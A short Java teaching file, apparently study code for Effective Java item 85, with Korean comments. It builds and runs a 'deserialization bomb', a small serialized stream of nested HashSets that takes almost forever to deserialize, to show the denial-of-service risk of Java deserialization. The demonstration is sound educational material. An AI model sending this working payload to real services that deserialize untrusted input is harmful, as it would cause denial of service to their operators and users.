package ch12.item85;

import java.util.HashSet;
import java.util.Set;

import static ch12.Util.deserialize;
import static ch12.Util.serialize;


/**
 * 역직렬화의 위험성 - 역직렬화 폭탄
 *
 * 역직렬화에 시간이 오래 걸리는 짧은 스트림을 역직렬화하는 것만으로도 서비스 거부 공격(denial-of-service, DoS)공격에 쉽게 노출될 수 있다.
 *
 */
public class DeserializationBomb {
    public static void main(String[] args) throws Exception {
        System.out.println(bomb().length); // 직렬화된 바이트 배열의 길이를 출력
        deserialize(bomb());
        // 작은 크기의 바이트 배열을 생성했지만, 이를 역직렬화하면 내부 구조때문에 역직렬화작업이 거의 무한에 가깝게 오래 걸림
    }

    static byte[] bomb() {
        Set<Object> root = new HashSet<>();
        Set<Object> s1 = root;
        Set<Object> s2 = new HashSet<>();

        for (int i = 0; i < 10; i++) {
            Set<Object> t1 = new HashSet<>();
            Set<Object> t2 = new HashSet<>();
            t1.add("foo"); // t1을 t2와 다르게 만든다.

            s1.add(t1);
            s1.add(t2);

            s2.add(t1);
            s2.add(t2);

            s1 = t1;
            s2 = t2;
        }
        return serialize(root);
    }
}
